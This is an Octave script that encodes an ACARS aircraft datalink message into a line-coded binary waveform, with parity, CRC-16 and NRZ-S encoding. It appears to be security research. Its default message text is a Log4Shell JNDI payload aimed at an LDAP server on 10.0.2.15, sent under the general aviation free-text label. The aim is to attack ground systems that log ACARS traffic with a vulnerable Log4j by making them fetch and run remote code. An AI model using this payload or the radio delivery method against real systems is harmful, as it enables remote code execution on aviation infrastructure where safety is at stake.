% 
% Script to generate a line coded binary
% message for a Plain-old-ACARS waveform.
% 
% (c) 20 Jan 2022
% Artturi Juvonen
% artturi@juvonen.eu
% 

clear all
close all
clc

% Parity bit calculation and bit order conversion to LSB
function v = bitconv(variable)
  bin = dec2bin(variable,7);
  par = 1-mod(sum(bin(:,1:7)')',2);
  variable = [fliplr(bin),dec2bin(par)];
  v = variable;
endfunction;

% Message suffix definition
msg_crcsuffix = [ 0x7f ]; % DEL

% Example message definition #1 from gr-acars
msg_prekey =    [ 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff ]; % 128 times 1, no parity bits
msg_bit_sync =  [ 0x2b 0x2a ]; % +*
msg_char_sync = [ 0x16 0x16 ]; % SYN SYN
msg_so_head =   [ 0x01 ];      % SOH
msg_mode =      [ 0x67 ];      % g
msg_address =   [ 0x00 0x00 0x00 0x00 0x00 0x00 0x00 ]; % null null null null null null null
msg_tecn_ack =  [ 0x15 ];      % NAK
msg_label =     [ 0x53 0x51 ]; % SQ
msg_block_id =  [ 0x00 ];      % null
msg_so_text =   [ 0x02 ];      % STX
msg_text =      [ 0x30 0x32 0x58 0x53 0x43 0x44 0x47 0x4c 0x46 0x50 0x47 0x30 0x34 0x39 0x30 0x31 0x4e 0x30 0x30 0x32 0x33 0x33 0x45 0x56 0x31 0x33 0x36 0x39 0x37 0x35 0x2f ]; % max 220 chars, 02XSCDGLFPG04901N00233EV136975/
msg_suffix =    [ 0x03 ];      % EXT

% Example message definition #2 from libacars
##msg_prekey =    [ 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff ]; % 128 times 1, no parity bits
##msg_bit_sync =  [ 0x2b 0x2a ]; % +*
##msg_char_sync = [ 0x16 0x16 ]; % SYN SYN
##msg_so_head =   [ 0x01 ];      % SOH
##msg_mode =      [ 0x32 ];      % 2
##msg_address =   [ 0x2e 0x53 0x50 0x2d 0x4c 0x44 0x45 ]; % .SP-LDE
##msg_tecn_ack =  [ 0x15 ];      % NAK
##msg_label =     [ 0x32 0x33 ]; % 23
##msg_block_id =  [ 0x33 ];      % 3
##msg_so_text =   [ 0x02 ];      % STX
##msg_text =      [ 0x4d 0x30 0x39 0x41 0x4c 0x4f 0x30 0x32 0x44 0x4d 0x4f 0x4e 0x4e 0x30 0x31 0x4c 0x4f 0x30 0x32 0x44 0x4d 0x2f 0x2a 0x2a 0x32 0x39 0x32 0x30 0x34 0x31 0x45 0x4c 0x4c 0x58 0x45 0x50 0x57 0x41 0x32 0x30 0x34 0x31 0x30 0x30 0x32 0x38 ]; % max 220 chars, M09ALO02DMONN01LO02DM/**292041ELLXEPWA20410028
##msg_suffix =    [ 0x03 ];      % EXT

% log4shell attack vector
msg_label = [ 0x31 0x34 ];     % 14 (General Aviation Free Text)
msg_text_string = "${jndi:ldap://10.0.2.15:1389/zojnam}"; % log4shell payload

disp(["Default message: " msg_text_string]);
val = input(["Input message, max 220 chars (empty for default): "],"s");
if !isempty(val) 
  msg_text = uint8(strtrunc(val,220));
else
  msg_text = uint8(msg_text_string);
endif

% Generate message contents for CRC creation
acars_message_to_crc = [bin2dec(bitconv(msg_mode))',...
                        bin2dec(bitconv(msg_address))',...
                        bin2dec(bitconv(msg_tecn_ack))',...
                        bin2dec(bitconv(msg_label))',...
                        bin2dec(bitconv(msg_block_id))',...
                        bin2dec(bitconv(msg_so_text))',...
                        bin2dec(bitconv(msg_text))',...
                        bin2dec(bitconv(msg_suffix))'];

% Generate block check sequence with CRC-16 XMODEM
gen_crc_aju1

% Generate message binary sequence
acars_message_bin = strcat(
  reshape(dec2bin(msg_prekey)',1,[]),
  reshape(bitconv(msg_bit_sync)',1,[]),
  reshape(bitconv(msg_char_sync)',1,[]),
  reshape(bitconv(msg_so_head)',1,[]),
  reshape(bitconv(msg_mode)',1,[]),
  reshape(bitconv(msg_address)',1,[]),
  reshape(bitconv(msg_tecn_ack)',1,[]),
  reshape(bitconv(msg_label)',1,[]),
  reshape(bitconv(msg_block_id)',1,[]),
  reshape(bitconv(msg_so_text)',1,[]),
  reshape(bitconv(msg_text)',1,[]),
  reshape(bitconv(msg_suffix)',1,[]),
  reshape(dec2bin(msg_block_crc,16)',1,[]),
  reshape(bitconv(msg_crcsuffix)',1,[]));

% Non-return-to-zero space line coding
bin_nrzs = str2num(acars_message_bin(1));
for i = 2:length(acars_message_bin); % Every message starts with a one, so
                                     % the loop is started from the second bit
  bit_last = str2num(acars_message_bin(i-1)); % Previous bit
  if bit_last == str2num(acars_message_bin(i)) % If the bit did not change...
    bin_nrzs = [bin_nrzs,1];         % ...encode as one,
  else                               % otherwise
    bin_nrzs = [bin_nrzs,0];         % encode as zero
  endif
end